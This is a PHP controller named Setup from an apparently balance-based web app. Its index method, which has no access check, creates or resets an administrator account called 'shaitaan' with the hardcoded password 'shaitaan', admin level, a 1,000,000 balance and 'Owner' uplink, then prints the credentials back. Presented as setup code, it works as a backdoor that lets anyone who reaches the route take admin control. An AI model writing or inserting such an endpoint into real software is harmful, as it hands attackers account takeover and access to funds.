<?php

namespace App\Controllers;

use App\Models\UserModel;

class Setup extends BaseController
{
    public function index()
    {
        helper('nata');
        $userModel = new UserModel();
        
        $usernam = 'shaitaan';
        $password = 'shaitaan';
        $hash = create_password($password, true);

        $data = [
            'username' => $usernam,
            'password' => $hash,
            'fullname' => 'Shaitaan Admin',
            'level'    => 1,
            'status'   => 1,
            'saldo'    => 1000000,
            'uplink'   => 'Owner'
        ];

        $cekUser = $userModel->where('username', $usernam)->first();
        if ($cekUser) {
            $userModel->update($cekUser['id_users'], $data);
            return "User 'shaitaan' updated with password 'shaitaan'";
        } else {
            $userModel->insert($data);
            return "User 'shaitaan' created with password 'shaitaan'";
        }
    }
}
